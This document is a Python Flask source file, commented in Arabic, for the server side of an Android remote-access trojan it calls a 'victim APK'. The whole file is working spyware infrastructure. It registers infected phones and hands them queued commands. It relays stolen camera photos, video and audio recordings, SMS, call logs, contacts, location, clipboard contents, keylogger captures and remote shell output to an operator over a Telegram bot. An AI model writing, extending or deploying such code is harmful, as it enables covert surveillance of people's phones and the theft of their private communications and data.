# api_victim.py
# ============================================================
# API للضحية (Victim APK) — v2
# الصور والفيديو تُرسل مباشرة بدون تخزين
# ============================================================

import io
import base64
from flask import request, jsonify

from config import bot, redis_client
from imports_manager import (
    find_victim_by_token,
    register_victim_device,
    add_victim_data,
    update_victim_status,
    pop_victim_commands,
)


# ★★ أنواع البيانات التي لا تُخزن في Redis (كبيرة)
SKIP_STORE_TYPES = {
    "camera_photo", "photo_single",
    "video_record", "audio_record",
}


def init_victim_api(app, bot_instance=None):
    global bot
    if bot_instance:
        bot = bot_instance

    # ============================================================
    # Register
    # ============================================================
    @app.route('/apk/victim/register', methods=['POST'])
    def victim_register():
        try:
            data = request.get_json(silent=True) or {}
            victim_token = data.get('token', '').strip()

            if not victim_token:
                return jsonify({"error": "missing_token"}), 400

            victim_info = find_victim_by_token(victim_token)
            if not victim_info:
                print(f"[-] Invalid victim_token: {victim_token[:16]}")
                return jsonify({"error": "invalid_token"}), 403

            chat_id = victim_info['chat_id']
            victim_id = victim_info['victim_id']
            victim_name = victim_info.get('name', 'Unknown')

            device_id = data.get('device_id', '')
            model = data.get('model', 'Unknown')
            brand = data.get('brand', 'Unknown')
            android = data.get('android', 'Unknown')
            sdk = data.get('sdk', 0)

            register_victim_device(
                chat_id, victim_id, device_id,
                {"model": model, "brand": brand, "android": android, "sdk": sdk}
            )

            print(f"[+] Victim registered: {victim_name} | {model} | {device_id[:16]}")

            try:
                cid = int(chat_id) if str(chat_id).isdigit() else chat_id
                bot.send_message(
                    cid,
                    f"✅ **ضحية جديدة متصلة!**\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"👤 **الاسم:** `{victim_name}`\n"
                    f"📱 **الموديل:** `{brand} {model}`\n"
                    f"🤖 **Android:** `{android}` (SDK {sdk})\n"
                    f"🆔 **Device:** `{device_id[:16]}`\n\n"
                    f"🎛️ **استخدم:** /panel للتحكم",
                    parse_mode="Markdown"
                )
            except Exception as e:
                print(f"[-] notify error: {e}")

            return jsonify({"ok": True, "victim_id": victim_id}), 200
        except Exception as e:
            print(f"[-] register error: {e}")
            return jsonify({"error": str(e)}), 500

    # ============================================================
    # Poll
    # ============================================================
    @app.route('/apk/victim/poll', methods=['GET'])
    def victim_poll():
        try:
            victim_token = request.args.get('token', '').strip()
            if not victim_token:
                return jsonify({"commands": []}), 200

            victim_info = find_victim_by_token(victim_token)
            if not victim_info:
                return jsonify({"commands": []}), 200

            victim_id = victim_info['victim_id']
            chat_id = victim_info['chat_id']

            update_victim_status(chat_id, victim_id, "active")

            commands = pop_victim_commands(victim_id, max_count=10)
            if commands:
                print(f"[+] Delivered {len(commands)} commands to {victim_id[:8]}")

            return jsonify({"commands": commands}), 200
        except Exception as e:
            print(f"[-] poll error: {e}")
            return jsonify({"commands": []}), 200

    # ============================================================
    # Data
    # ============================================================
    @app.route('/apk/victim/data', methods=['POST'])
    def victim_data():
        try:
            data = request.get_json(silent=True) or {}
            victim_token = data.get('token', '').strip()
            dtype = data.get('type', '')

            if not victim_token:
                return jsonify({"status": "no_token"}), 200

            victim_info = find_victim_by_token(victim_token)
            if not victim_info:
                print(f"[-] data from unknown token: {victim_token[:16]}")
                return jsonify({"status": "invalid_token"}), 200

            chat_id = victim_info['chat_id']
            victim_id = victim_info['victim_id']
            victim_name = victim_info.get('name', 'Unknown')

            # ★★ لا تخزن الصور/الفيديو/الصوت (كبيرة الحجم)
            if dtype not in SKIP_STORE_TYPES:
                try:
                    add_victim_data(victim_id, data)
                except Exception as e:
                    print(f"[-] store error: {e}")

            try:
                update_victim_status(chat_id, victim_id, "active")
            except Exception:
                pass

            cid = int(chat_id) if str(chat_id).isdigit() else chat_id
            print(f"[<<] {dtype} from {victim_name} ({victim_id[:8]})")

            # ============================================================
            # Camera Photo
            # ============================================================
            if dtype == "camera_photo":
                img_data = data.get('image', '')
                cam_name = data.get('camera_name', '')
                cam_icon = "📷 أمامية" if cam_name == "front" else "📸 خلفية"

                if img_data and img_data.startswith("data:image"):
                    try:
                        _, encoded = img_data.split(",", 1)
                        img_bytes = base64.b64decode(encoded)
                        buf = io.BytesIO(img_bytes)
                        buf.name = f"camera_{cam_name}.jpg"
                        bot.send_photo(
                            cid, buf,
                            caption=f"📸 **{cam_icon}**\n"
                                    f"👤 `{victim_name}`\n"
                                    f"🆔 `{victim_id[:8]}`",
                            parse_mode="Markdown"
                        )
                        print(f"[+] Photo sent to {cid}")
                    except Exception as e:
                        print(f"[-] photo error: {e}")
                        try:
                            bot.send_message(cid, f"❌ صورة فاشلة: {e}")
                        except Exception:
                            pass
                else:
                    try:
                        bot.send_message(cid, f"❌ صورة فاضية من {victim_name}")
                    except Exception:
                        pass

            # ============================================================
            # Video
            # ============================================================
            elif dtype == "video_record":
                video_data = data.get('video', '')
                duration = data.get('duration', 0)
                if video_data and video_data.startswith("data:video"):
                    try:
                        _, encoded = video_data.split(",", 1)
                        vid_bytes = base64.b64decode(encoded)
                        buf = io.BytesIO(vid_bytes)
                        buf.name = "record.mp4"
                        bot.send_video(
                            cid, buf,
                            caption=f"🎥 **فيديو {duration/1000:.1f} ثانية**\n"
                                    f"👤 `{victim_name}`",
                            parse_mode="Markdown"
                        )
                        print(f"[+] Video sent to {cid}")
                    except Exception as e:
                        print(f"[-] video error: {e}")
                        try:
                            bot.send_message(cid, f"❌ فيديو فاشل: {e}")
                        except Exception:
                            pass

            # ============================================================
            # Audio
            # ============================================================
            elif dtype == "audio_record":
                audio_data = data.get('audio', '')
                duration = data.get('duration', 0)
                if audio_data and audio_data.startswith("data:audio"):
                    try:
                        _, encoded = audio_data.split(",", 1)
                        aud_bytes = base64.b64decode(encoded)
                        buf = io.BytesIO(aud_bytes)
                        buf.name = "record.3gp"
                        bot.send_audio(
                            cid, buf,
                            caption=f"🎙️ **صوت {duration/1000:.1f} ثانية**\n"
                                    f"👤 `{victim_name}`",
                            parse_mode="Markdown"
                        )
                        print(f"[+] Audio sent to {cid}")
                    except Exception as e:
                        print(f"[-] audio error: {e}")
                        try:
                            bot.send_message(cid, f"❌ صوت فاشل: {e}")
                        except Exception:
                            pass

            # ============================================================
            # Device Info
            # ============================================================
            elif dtype == "device_info":
                text = (
                    f"📱 **معلومات الجهاز**\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"👤 `{victim_name}`\n"
                    f"📦 الموديل: `{data.get('model')}`\n"
                    f"🏭 الشركة: `{data.get('brand')}`\n"
                    f"🤖 Android: `{data.get('android')}`"
                )
                bot.send_message(cid, text, parse_mode="Markdown")

            # ============================================================
            # Battery
            # ============================================================
            elif dtype == "battery":
                level = data.get('level', 0)
                charging = data.get('charging', False)
                text = (
                    f"🔋 **البطارية**\n"
                    f"👤 `{victim_name}`\n"
                    f"📊 `{level}%`\n"
                    f"⚡ `{'يشحن' if charging else 'لا يشحن'}`"
                )
                bot.send_message(cid, text, parse_mode="Markdown")

            # ============================================================
            # SMS
            # ============================================================
            elif dtype == "sms":
                sms_list = data.get("sms", [])
                if not sms_list:
                    bot.send_message(cid, f"📭 لا رسائل من {victim_name}")
                else:
                    lines = [f"📨 **SMS ({len(sms_list)})** — `{victim_name}`", "━" * 20]
                    for s in sms_list[:20]:
                        lines.append(f"📩 `{s.get('from')}`:\n{s.get('body','')[:150]}\n───")
                    msg = "\n".join(lines)
                    for i in range(0, len(msg), 4000):
                        bot.send_message(cid, msg[i:i+4000], parse_mode="Markdown")

            # ============================================================
            # Calls
            # ============================================================
            elif dtype == "call_log":
                calls = data.get("calls", [])
                type_map = {"1": "📥", "2": "📤", "3": "❌"}
                lines = [f"📞 **سجل المكالمات** — `{victim_name}`", "━" * 20]
                for c in calls[:25]:
                    t = type_map.get(str(c.get('type','')), '❓')
                    lines.append(f"{t} `{c.get('number')}` — {c.get('duration')}s")
                bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")

            # ============================================================
            # Contacts — ★ دعم كامل للنسختين ★
            # ============================================================
            elif dtype == "contacts":
                contact = data.get("contact", None)
                if contact:
                    # ★ نسخة فردية
                    index = data.get("index", 0)
                    total = data.get("total", 0)
                    name = contact.get("name", "?")
                    number = contact.get("number", "?")
                    
                    # أرسل كل 25 مع بعض
                    if index % 25 == 0:
                        try:
                            bot.send_message(
                                cid,
                                f"📇 **جهات الاتصال** ({index + 1}/{total})\n"
                                f"• `{name}` — `{number}`",
                                parse_mode="Markdown"
                            )
                        except Exception:
                            pass
                else:
                    # ★ نسخة كاملة (قديم)
                    contacts = data.get("contacts", [])
                    if not contacts:
                        bot.send_message(cid, f"📭 لا جهات اتصال من {victim_name}")
                    else:
                        lines = [f"👥 **جهات الاتصال ({len(contacts)})** — `{victim_name}`", "━" * 20]
                        for c in contacts[:80]:
                            lines.append(f"• `{c.get('name')}` — `{c.get('number')}`")
                        msg = "\n".join(lines)
                        for i in range(0, len(msg), 4000):
                            bot.send_message(cid, msg[i:i+4000], parse_mode="Markdown")

            elif dtype == "contacts_done":
                total = data.get("total", 0)
                bot.send_message(
                    cid,
                    f"✅ **تم استلام {total} جهة اتصال** — `{victim_name}`",
                    parse_mode="Markdown"
                )

            # ============================================================
            # Apps
            # ============================================================
            elif dtype == "apps":
                apps = data.get("apps", [])
                lines = [f"📲 **التطبيقات ({len(apps)})** — `{victim_name}`", "━" * 20]
                for a in apps[:80]:
                    lines.append(f"• {a.get('name')}")
                msg = "\n".join(lines)
                for i in range(0, len(msg), 4000):
                    bot.send_message(cid, msg[i:i+4000], parse_mode="Markdown")

            # ============================================================
            # Location
            # ============================================================
            elif dtype == "location":
                lat = data.get("lat")
                lng = data.get("lng")
                if lat and lng:
                    bot.send_message(
                        cid,
                        f"📍 **الموقع** — `{victim_name}`\n"
                        f"`{lat}, {lng}`\n"
                        f"[خرائط](https://maps.google.com/?q={lat},{lng})",
                        parse_mode="Markdown"
                    )
                else:
                    bot.send_message(cid, f"❌ لا يوجد موقع من {victim_name}")

            # ============================================================
            # Clipboard
            # ============================================================
            elif dtype == "clipboard":
                text = data.get("text", "")
                if text:
                    bot.send_message(
                        cid,
                        f"📋 **الحافظة** — `{victim_name}`\n```\n{text[:500]}\n```",
                        parse_mode="Markdown"
                    )
                else:
                    bot.send_message(cid, f"📋 الحافظة فاضية — {victim_name}")

            # ============================================================
            # Photo Single
            # ============================================================
            elif dtype == "photo_single":
                img_data = data.get("image", "")
                img_name = data.get("name", "photo.jpg")
                if img_data and img_data.startswith("data:image"):
                    try:
                        _, encoded = img_data.split(",", 1)
                        img_bytes = base64.b64decode(encoded)
                        buf = io.BytesIO(img_bytes)
                        buf.name = img_name
                        bot.send_photo(
                            cid, buf,
                            caption=f"🖼️ **{img_name}** — `{victim_name}`",
                            parse_mode="Markdown"
                        )
                    except Exception as e:
                        print(f"[-] photo_single error: {e}")

            # ============================================================
            # Photos List
            # ============================================================
            elif dtype == "photos":
                photos = data.get("photos", [])
                lines = [f"🖼️ **الصور ({len(photos)})** — `{victim_name}`"]
                for p in photos[:20]:
                    lines.append(f"• `{p.get('path')}`")
                bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")

            # ============================================================
            # Shell
            # ============================================================
            elif dtype == "shell_result":
                cmd = data.get("command", "")
                output = data.get("output", "")
                bot.send_message(
                    cid,
                    f"💻 **Shell** — `{victim_name}`\n"
                    f"`{cmd}`\n```\n{output[:2000]}\n```",
                    parse_mode="Markdown"
                )

            # ============================================================
            # Command Result
            # ============================================================
            elif dtype == "cmd_result":
                action = data.get("action", "")
                status = data.get("status", "")
                error = data.get("error", "")
                if status == "fail":
                    bot.send_message(
                        cid,
                        f"❌ **فشل أمر على `{victim_name}`**\n"
                        f"الأمر: `{action}`\n"
                        f"السبب: `{error[:200]}`",
                        parse_mode="Markdown"
                    )

            # ============================================================
            # Keylog
            # ============================================================
            elif dtype == "keylog":
                text = data.get("text", "")
                if text.strip():
                    bot.send_message(
                        cid,
                        f"⌨️ **لوحة مفاتيح** — `{victim_name}`\n"
                        f"```\n{text[:500]}\n```",
                        parse_mode="Markdown"
                    )

            elif dtype == "heartbeat":
                pass

            try:
                update_victim_status(chat_id, victim_id, "active")
            except Exception:
                pass

            return jsonify({"status": "ok"}), 200
        except Exception as e:
            print(f"[-] victim_data error: {e}")
            import traceback
            traceback.print_exc()
            return jsonify({"status": "error"}), 200
